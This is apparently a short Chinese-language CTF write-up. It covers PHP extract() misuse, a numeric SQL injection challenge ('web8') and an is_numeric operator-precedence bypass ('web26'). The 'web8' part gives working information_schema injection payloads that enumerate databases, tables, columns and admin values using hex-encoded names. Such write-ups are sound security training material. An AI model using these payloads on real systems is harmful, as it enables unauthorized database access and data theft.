?a=

extract — 从数组中将变量导入到当前的符号表
知识点：不要对不能信任的数据使用 extract()，例如用户的输入（\$_GET,\$_POST,\$_FILES等)

web8

age处存在数字型注入
爆库：

(select group_concat(schema_name) from information_schema.schemata)


爆表：

(select group_concat(table_name) from information_schema.tables where table_schema=0x77656238)


爆列：

(select group_concat(column_name) from information_schema.columns where table_name=0x7573657273)


爆值：

(select description from (select * from users where username regexp 0x61646d696e limit 0,1)a)

语句没错，能执行，但是有傻逼把flag删掉了，照着官方wp打都不出flag

web26

其中/\d+/sD表示匹配数字字符串
\$result=is_numeric(\$num) and is_numeric(\$str)存在运算符优先级漏洞
\$result返回的值只和is_numeric(\$num)有关，所以构造符合正则的的值上传即可得到flag，如：

?num=1&str=a
